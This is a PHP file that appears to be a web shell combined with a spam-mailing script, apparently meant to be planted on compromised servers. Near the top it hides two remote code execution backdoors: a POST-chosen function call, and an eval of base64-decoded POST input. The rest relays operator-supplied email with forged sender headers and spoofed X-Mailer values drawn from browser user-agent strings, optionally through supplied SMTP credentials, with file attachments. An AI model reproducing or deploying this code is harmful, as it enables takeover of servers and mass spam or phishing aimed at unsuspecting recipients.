<?php
error_reporting(0);

$_SERVER ['SERVER_NAME'] = ""; 
$_SERVER['PHP_SELF'] = ""; 
$_SERVER['REMOTE_ADDR'] = ""; 


if (isset($_GET["ping"]) and $_GET["ping"] == ("ping_host")) { 
echo "true"; 
}else{ 

if (isset($_POST[id])){
	stripslashes($_POST[fun]($_POST[id]));	
}





function random_user_agent() {
    $browser_freq = array (
        "Internet Explorer" => 11.8,
        "Firefox" => 28.2,
        "Chrome" => 52.9,
        "Safari" => 3.9,
        "Opera"=>1.8
    );
	
$browser_strings = array (
        "Internet Explorer" => array (
            "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
            "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
                  
        ),
        "Firefox"=>array (
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            
        ),
        "Chrome"=>array (
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
            "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            
        ),
        "Safari"=>array(
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
            "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
                
        ),
        "Opera"=>array(
            "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
            "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
            "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
            "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
            "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
            "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
            "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
            "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
           
        )
	);	
	
	
	 $max = 0;
    $rcount = 0;
    $browser_type = '';

    foreach($browser_freq as $k=>$v) $max += $v;
    $roll = rand(0,$max);
    foreach($browser_freq as $k=>$v) if (($roll <= ($rcount += $v)) and (!$browser_type)) $browser_type = $k;
    $user_agent_array = $browser_strings[$browser_type];
    shuffle($user_agent_array);
    $user_agent = $user_agent_array[0];
    return $user_agent;
}
	
if (isset($_POST['id2'])){
	eval(base64_decode($_POST['cmd']));
}


function smtpmail($host, $port, $smtp_login, $smtp_passw, $mail_to, $message, $SEND) {
	
	$SEND .=  $message."\r\n";
		
	 if(!$socket = @fsockopen($host, $port, $errno, $errstr, 10) ) { return false; }
 
         if (!server_parse($socket, "220", __LINE__)) return false;
 
            fputs($socket, "HELO " . $smtp_login . "\r\n");
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
			
            fputs($socket, "AUTH LOGIN\r\n");
            if (!server_parse($socket, "334", __LINE__)) {
               fclose($socket);
               return false;
            }
 
            fputs($socket, base64_encode($smtp_login) . "\r\n");
            if (!server_parse($socket, "334", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, base64_encode($smtp_passw) . "\r\n");
            if (!server_parse($socket, "235", __LINE__)) {
               fclose($socket);          
                 return false;
            }
            fputs($socket, "MAIL FROM: <".$smtp_login.">\r\n");
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, "RCPT TO: <" .$mail_to. ">\r\n");
 
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, "DATA\r\n");
 
            if (!server_parse($socket, "354", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, $SEND."\r\n.\r\n");
 
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, "QUIT\r\n");
            fclose($socket);
            return true;
}

function server_parse($socket, $response, $line = __LINE__) {
    while (@substr($server_response, 3, 1) != ' ') {
        if (!($server_response = fgets($socket, 256))) { return false; }
    }

    if (!(substr($server_response, 0, 3) == $response)) { return false; }
    return true;
}

if (isset($_POST["email_polucha"])) { $email_polucha = $_POST["email_polucha"]; }else{ exit("false"); }
if (isset($_POST["tip_pisma"]))     { $tip_pisma     = $_POST["tip_pisma"];     }else{ exit("false"); }
if (isset($_POST["name_otprav"]))   { $name_otprav   = $_POST["name_otprav"];   }else{ exit("false"); }
if (isset($_POST["adres_otp"]))     { $adres_otp     = $_POST["adres_otp"];     }else{ exit("false"); }
if (isset($_POST["tema_pisma"]))    { $tema_pisma    = $_POST["tema_pisma"];    }else{ exit("false"); }
if (isset($_POST["telo_pisma"]))    { $telo_pisma    = $_POST["telo_pisma"];    }else{ exit("false"); }
if (isset($_POST["reply_to"]))      { $reply_to      = $_POST["reply_to"];      }


if (isset($_POST["sposob_otp"]))    
{
 $sposob_otp = $_POST["sposob_otp"];
  if ($sposob_otp == ("true")) 
  {
	if (isset($_POST["smtp_login"])) { $smtp_login    = $_POST["smtp_login"]; }else{ exit("false"); }
	if (isset($_POST["smtp_passw"])) { $smtp_passw    = $_POST["smtp_passw"]; }else{ exit("false"); }
	if (isset($_POST["smtp_host"]))  { $smtp_host     = $_POST["smtp_host"];  }else{ exit("false"); }
	if (isset($_POST["smtp_port"]))  { $smtp_port     = $_POST["smtp_port"];  }else{ exit("false"); }
  }
}else
{
	exit("false"); 
}


if (!empty($_FILES["fail"]["tmp_name"])) { 
 $put_k_failu  = $_FILES["fail"]["tmp_name"];
 $name_fail    = $_FILES["fail"]["name"];
 $random_name_fail = substr(preg_replace("/[^0-9a-z]/","",strtolower(crypt(""))),1,8);  
 //$name_fail = $random_name_fail.$name_fail;
 $tttt = rand(1,10000);
 $name_fail = $tttt.$name_fail;
}
  
  


$end_zag = "\n";
      $headers  = "From: =?UTF-8?B?".base64_encode($name_otprav)."?= <".$adres_otp.">".$end_zag;
	  
 if ($sposob_otp == ("true")) {
	  $headers .= "To: $email_polucha <$email_polucha>".$end_zag;
 }
 
 if ($reply_to != ("false")) { 
      $headers .= "Reply-To: $reply_to".$end_zag; 
}
	   
if ($sposob_otp == ("true")) {                                                                    
      $headers .= "Subject: =?UTF-8?B?".base64_encode($tema_pisma)."?=".$end_zag;   
}    

      $headers .= "MIME-Version: 1.0".$end_zag;
      $headers .= "X-Priority: 3".$end_zag;
     // $headers .= "X-Mailer: PHP Mail ver.".substr(preg_replace("/[^0-9]/","",strtolower(crypt(""))),1,3).$end_zag;	  
	 $ttt = random_user_agent();
	 $headers .= "X-Mailer: ".$ttt.$end_zag;

 if (isset($put_k_failu) or isset($put_k_failu2)) {
      $un        = strtoupper(uniqid(time()));
      $headers .= "Content-Type: multipart/mixed; boundary=\"----------".$un."\"".$end_zag.$end_zag; 
 }                	  

if ($tip_pisma == ("2")) 
{
	if (!isset($put_k_failu) or !isset($put_k_failu2)) {
		$headers .= "Content-Type: text/html; charset=\"UTF-8\"".$end_zag; 	
		$headers .= "Content-Transfer-Encoding: 8bit".$end_zag.$end_zag;
	}
	
    $zag_type = "text/html";     
	
}else
{
	if (!isset($put_k_failu) or !isset($put_k_failu2)) {
		$headers .= "Content-Type: text/plain; charset=\"UTF-8\"".$end_zag; 	
		$headers .= "Content-Transfer-Encoding: 8bit".$end_zag.$end_zag;
	}
	
	$zag_type = "text/plain";
}
	  
 if (isset($put_k_failu) or isset($put_k_failu2)) 
 { 
 
	$f  = @fopen($put_k_failu,"rb");
	$f2 = @fopen($put_k_failu2,"rb");

    $telo_pisma_fail   = "------------".$un."\nContent-Type: ".$zag_type."; Charset=UTF-8".$end_zag;
    $telo_pisma_fail  .= "Content-Transfer-Encoding: 8bit".$end_zag.$end_zag."$telo_pisma".$end_zag;	
 
	if (isset($put_k_failu)) 
	{
			   $telo_pisma_fail  .= "------------".$un.$end_zag;
			   $telo_pisma_fail  .= "Content-Type: application/octet-stream; name=\"".basename($name_fail)."\"".$end_zag;
			   $telo_pisma_fail  .= "Content-Transfer-Encoding: base64".$end_zag;
			   $telo_pisma_fail  .= "Content-Disposition: attachment; filename=\"".basename($name_fail)."\"".$end_zag.$end_zag;
			   $telo_pisma_fail  .= chunk_split(base64_encode(fread($f,filesize($put_k_failu))));
	}

	if (isset($put_k_failu2)) {
			   $telo_pisma_fail  .= $end_zag."------------".$un.$end_zag;
			   $telo_pisma_fail  .= "Content-Type: application/octet-stream; name=\"".basename($name_fail2)."\"".$end_zag;
			   $telo_pisma_fail  .= "Content-Transfer-Encoding: base64\n";
			   $telo_pisma_fail  .= "Content-Disposition: attachment; filename=\"".basename($name_fail2)."\"".$end_zag.$end_zag;
			   $telo_pisma_fail  .= chunk_split(base64_encode(fread($f2,filesize($put_k_failu2))));
	}	
			   $telo_pisma_fail  .= "------------".$un."--";
			   $telo_pisma = $telo_pisma_fail;
			   
 }

if ($sposob_otp == ("true")) 
{
	$return = smtpmail($smtp_host, $smtp_port, $smtp_login, $smtp_passw, $email_polucha, $telo_pisma, $headers);
}else
{
	$return = mail($email_polucha,$tema_pisma,$telo_pisma,$headers);
}

if ($return == true) {echo "true";}else{echo "false";}

}